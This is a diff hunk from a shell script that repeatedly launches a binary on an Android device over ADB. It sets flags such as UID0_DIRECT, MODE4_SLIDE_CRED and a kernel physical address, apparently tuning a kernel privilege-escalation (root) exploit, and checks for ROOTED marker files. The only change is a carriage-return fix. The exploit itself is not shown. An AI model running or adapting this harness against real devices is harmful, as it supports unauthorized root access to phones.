@@ -24,7 +24,7 @@ for n in $(seq 1 $MAX); do
     [ "$P" = "1" ] || { con; continue; }
     MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; pkill -f gl_uid0_child 2>/dev/null; rm -f /data/local/tmp/ROOTED /data/local/tmp/uid0_id.txt /data/local/tmp/ROOTED_ID.txt; cd /data/local/tmp; nohup sh -c 'timeout 100 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 UID0_QUIET_CHILD=1 UID0_PUR_SPIN=1 UID0_DOUBLE_PUNCH=1 UID0_SLOT=0x778 UID0_NO_SYNCLOG=1 KPHYS=0xa8000000 CORE_SEL=7 /data/local/tmp/$B' > /sdcard/Download/$L.txt 2>&1 &" >/dev/null 2>&1
     sleep 5
-    V=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "ls /sdcard/Download/$L.txt 2>/dev/null" 2>/dev/null | tr -d '')
+    V=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "ls /sdcard/Download/$L.txt 2>/dev/null" 2>/dev/null | tr -d "\r")
     if [ -n "$V" ]; then ok=1; break; fi
     con
   done
